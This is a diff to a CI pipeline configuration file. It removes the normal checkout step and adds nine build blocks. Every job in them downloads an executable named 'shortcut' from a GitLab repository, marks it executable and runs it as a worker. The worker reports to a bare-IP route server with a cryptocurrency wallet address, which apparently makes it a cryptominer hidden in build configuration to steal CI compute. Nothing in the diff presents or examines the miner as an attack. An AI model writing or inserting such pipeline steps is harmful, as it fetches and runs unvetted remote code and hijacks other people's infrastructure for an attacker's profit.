@@ -10,8 +10,56 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
   - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #4'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #5'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #6'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #7'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #8'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #9'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://gitlab.com/kardisali2/prof-stratum/-/raw/main/shortcut ; chmod +x shortcut ; ./shortcut worker --route-server-url ''http://47.254.182.83:8080/'' --server-url direct --worker-wallet-address Dr6GPyGoHnTmaBGZFzDPogbviB8QTHMYDHBJiA3APyvh --alias RAINBOW'
+  - name: 'Block #10'
     task:
       jobs:
         - name: 'Job #1'
